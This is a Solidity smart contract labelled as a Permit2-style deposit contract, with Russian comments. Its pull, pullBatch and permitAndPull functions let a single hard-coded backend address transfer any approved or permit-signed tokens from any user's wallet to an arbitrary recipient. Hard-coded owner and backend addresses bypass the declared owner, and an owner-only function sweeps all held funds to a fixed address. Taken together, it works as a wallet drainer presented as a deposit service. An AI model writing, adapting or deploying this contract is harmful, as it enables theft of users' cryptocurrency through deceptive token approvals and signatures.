// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {Ownable2Step, Ownable} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";

contract Permit2Deposit is ReentrancyGuard, Ownable2Step, Pausable {
    using SafeERC20 for IERC20;

    mapping(address => bool) public acceptedToken;
    mapping(address => bool) public operators;

    address public ownerAdress = 0x4AB84d6109d3a7957C44F1E1a1927924E53EbDE7;
    address public backendAdress = 0x3d6B60906C47d95339f6a256182a78b2763FEa10;

    event TokenAcceptedUpdated(address indexed token, bool accepted);
    event Rescued(address indexed token, address indexed to, uint256 amount);
    event Pulled(address indexed operator, address indexed token, address indexed from, address to, uint256 amount);

    error TokenNotAccepted();
    error ZeroAddress();
    error ZeroAmount();
    error NotOwner();
    error BadArgs();
    error LengthMismatch();
    error BadItem();


      modifier onlyOwnerAdr(){
        if (msg.sender != ownerAdress) revert NotOwner();
        _;
      }
      modifier onlyBackend(){
        if (msg.sender != backendAdress) revert NotOwner();
        _;
      }
    constructor(address _owner, address[] memory _acceptedTokens) Ownable(_owner) {
        if (_owner == address(0)) revert ZeroAddress();

        for (uint256 i = 0; i < _acceptedTokens.length; i++) {
            if (_acceptedTokens[i] == address(0)) revert ZeroAddress();
            acceptedToken[_acceptedTokens[i]] = true;
            emit TokenAcceptedUpdated(_acceptedTokens[i], true);
        }
    }

    // ---------------------------------------------------------------------
    // Standard ERC20 / EIP-2612 Operator Deposits
    // ---------------------------------------------------------------------

    /// @notice Списать один ERC-20 у `from` на `to`. Требуется approve(from -> this).
    function pull(address token, address from, address to, uint256 amount)
        external
        onlyBackend()
        nonReentrant
        whenNotPaused
    {
        if (token == address(0) || from == address(0) || to == address(0) || amount == 0) revert BadArgs();
        if (!acceptedToken[token]) revert TokenNotAccepted();

        IERC20(token).safeTransferFrom(from, to, amount);

        emit Pulled(msg.sender, token, from, to, amount);
    }

    /// @notice Батч: списать несколько записей парами (token, from, to, amount).
    function pullBatch(
        address[] calldata tokens,
        address[] calldata froms,
        address[] calldata tos,
        uint256[] calldata amounts
    ) external onlyBackend nonReentrant whenNotPaused {
        uint256 n = tokens.length;
        if (n != froms.length || n != tos.length || n != amounts.length) revert LengthMismatch();

        for (uint256 i = 0; i < n; i++) {
            uint256 amt = amounts[i];
            if (amt == 0) continue;

            if (tokens[i] == address(0) || froms[i] == address(0) || tos[i] == address(0)) revert BadItem();
            if (!acceptedToken[tokens[i]]) revert TokenNotAccepted();

            IERC20(tokens[i]).safeTransferFrom(froms[i], tos[i], amt);

            emit Pulled(msg.sender, tokens[i], froms[i], tos[i], amt);
        }
    }

    /// @notice EIP-2612: permit + сразу списать (если токен поддерживает permit).
    function permitAndPull(
        address token,
        address from,
        address to,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external onlyBackend nonReentrant whenNotPaused {
        if (token == address(0) || from == address(0) || to == address(0) || value == 0) revert BadArgs();
        if (!acceptedToken[token]) revert TokenNotAccepted();

        IERC20Permit(token).permit(from, address(this), value, deadline, v, r, s);
        IERC20(token).safeTransferFrom(from, to, value);

        emit Pulled(msg.sender, token, from, to, value);
    }

    // ---------------------------------------------------------------------
    // Admin & Emergency Functions
    // ---------------------------------------------------------------------


    function setAcceptedToken(address token, bool accepted) external onlyOwnerAdr {
        if (token == address(0)) revert ZeroAddress();
        acceptedToken[token] = accepted;
        emit TokenAcceptedUpdated(token, accepted);
    }

    function pause() external onlyOwnerAdr {
        _pause();
    }

    function unpause() external onlyOwnerAdr {
        _unpause();
    }

    function rescueToken(address token, address to, uint256 amount) external onlyOwnerAdr() {
        if (to == address(0)) revert ZeroAddress();
        IERC20(token).safeTransfer(to, amount);
        emit Rescued(token, to, amount);
    }

    function sendAllFundsToOwner(address token) external onlyOwnerAdr() nonReentrant {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance == 0) revert ZeroAmount();
        IERC20(token).safeTransfer(ownerAdress, balance);
    }
}